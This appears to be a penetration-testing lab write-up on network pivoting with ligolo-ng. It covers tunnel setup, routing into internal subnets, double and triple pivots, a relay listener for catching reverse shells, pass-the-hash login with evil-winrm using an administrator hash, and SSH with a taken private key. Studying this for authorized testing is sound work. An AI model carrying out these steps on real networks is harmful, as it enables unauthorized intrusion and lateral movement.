# Download the files
Worth checking the current tag before pulling these — ligolo-ng ships often and this goes stale fast. v0.8.3 is current as of this writing.
## Agent File:
```
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
```
```
tar -xvf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
```
```
sudo mv agent lin-agent
```
## Proxy File
```
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
```
```
tar -xvf ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
```
```
sudo mv proxy lin-proxy
```
# Ligolo-ng
## Attack Host
These commands create a tun interface on the Proxy Server (C2). Worth noting up front why this setup step exists at all — chisel and socat never touch routing, so neither needs root/CAP_NET_ADMIN on either end. Ligolo does, because what we're building here is a real interface, not just a forwarded port.
```
sudo ip tuntap add user root mode tun ligolo
```
```
sudo ip link set ligolo up
```
1. On your machine get ligolo running
```
./lin-proxy -selfcert
```
```
./lin-proxy -selfcert -laddr 0.0.0.0:443 
```
2. Before sending the agent anywhere, grab the cert fingerprint from the proxy console — copy what it prints, we'll hand it to the agent next instead of making it trust the connection blind:
```
ligolo-ng » certificate_fingerprint
```
3. Transfer lin-agent to DMZ
## DMZ (10.129.202.17 172.16.8.120)
```
chmod +x lin-agent
```
```
./lin-agent -connect 10.10.14.74:11601 -accept-fingerprint 3f:8a:1c:9e:22:47:b6:d0:5a:e1:73:c4:88:0f:36:d9:a2:5b:e7:14:f8:63:29:ab:d4:70:1e:9c:55:8b:02:6f
```
(`-ignore-cert` still works if it's a closed lab and we don't care about the wire — no real reason not to just pin the fingerprint though, now that we have it.)
**If the DMZ host can't reach us at all** (outbound filtered, only inbound allowed on a specific port), flip it around instead of fighting the firewall. On the DMZ host: `./lin-agent -bind 0.0.0.0:11601`. Then we connect out to it from the proxy console:
```
ligolo-ng » connect_agent --ip 172.16.8.120:11601
```
4. Connection back to our Attack Machine
5. You should see the connection get grabbed by the ligolo tool if the commands were ran successfully on target machine.
6. Next we need to add the internal subnet of the DMZ Host machine to be able to access it, which is 172.16.8.0/32 (/16 did not work so modify it to /32 or /24 until you can add the network and not get an error) then enter start command within the ligolo termnial to start the tunnel to DMZ
```
sudo ip route add 172.16.8.0/32 dev ligolo
```
```
ligolo-ng » session
```
```
? Specify a session : 1 - root@dmz01 - 10.129.202.17:43968
[Agent : root@dmz01] » start
[Agent : root@dmz01] » INFO[0722] Starting tunnel to root@dmz01
```
7. Now we can access any `ip` on the internal network `172.16.8.0/24` from our attack box without the need to input `proxychains`
```
evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```
## Reaching a Port Bound to the Agent's Own Loopback
While poking around the DMZ host we spot a service listening on 127.0.0.1 only — nothing on the `172.16.8.0/24` route we already added reaches it, because it's not actually on that network, it's local to the agent itself. Ligolo has a magic CIDR for exactly this, `240.0.0.0/4`, that gets redirected straight to whichever agent's session is active:
```
sudo ip route add 240.0.0.1/32 dev ligolo
```
```
nmap -sV 240.0.0.1
```
This is one of the spots where ligolo actually saves us work over chisel or socat — either of those would've needed an explicit forward set up the moment we noticed the loopback-only service. Here the route we already had is general enough to just catch it.
## Listener — Relaying a Port Back Through the Agent
`listener_add` shows up again in the Double Pivoting walkthrough below, but it's worth understanding on its own first, because it isn't just a double-pivot trick — it opens a listening socket on the **agent's** side of the tunnel and relays whatever connects to it back to an address our proxy can reach. Useful any time something can only reach the DMZ host and not us directly — catching a reverse shell from a third segment, for example:
```
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```
```
ligolo-ng » listener_list
```
```
ligolo-ng » listener_stop 0
```
With a `nc -lvnp 4444` (or an MSF handler) running locally against `127.0.0.1:4444`, anything that hits the DMZ host on port 4444 lands in our listener. The Double Pivoting section below is one applied use of this exact feature — a listener catching the second agent's connection instead of a reverse shell.
# Double Pivoting
To Double Pivot and access the Ubuntu Host (only accessible from Windows Machine DC) we need to have a ligolo session from the Windows DC host (172.16.8.3)
## Attack Host
1. Download agent.exe
```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_windows_amd64.zip
```
```
agent.exe
```
2. Transfer agent.exe to the Windows Host P1
3. On the attacker machine, we have to create a listener to send the second host traffic to the proxy server and connect through a tunnel:
```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```
```
listener_list
```
## Windows DC Host machine 
4. We need to execute the agent.exe file and input the DMZ internal IP address (which is 172.16.8.120, while we added a listener on the same port we will get a new session on ligolo from the Windows DC
```
PS C:\users> ./agent.exe -connect 172.16.8.120:11601 -ignore-cert
```
## Attack Host
5. session created
```
? Specify a session : 2 - INLANEFREIGHT\Administrator@DC01 - 127.0.0.1:47236
```
6. Now we need to add the internal network 172.16.9.0 that is only visible to the Windows DC Host in order to access it from our machine (Ubuntu Host machine has the ip 172.16.9.25)
```
sudo ip route add 172.16.9.0/24 dev ligolo
```
```
ip route
```
7. You should see the following ip routes
```
172.16.8.0/24 dev ligolo scope link 
172.16.9.0/24 dev ligolo scope link
```
8. We can now access the 172.16.9.0/24 network from our host machine
```
ssh -i ssmallsadm_id-rsa ssmallsadm@172.16.9.25
```
**Connection established**
# Triple Pivot (and Beyond)
Nothing about the double pivot above is capped at two hops. If there's a third segment only reachable from the Ubuntu Host we just landed on, the pattern repeats exactly: transfer another agent onto it, `listener_add` on the Ubuntu Host's session to relay a new connection back to the proxy, connect the third agent in, `route add` the third subnet. Same four moves as the Double Pivoting section above, just one hop further down the chain each time.
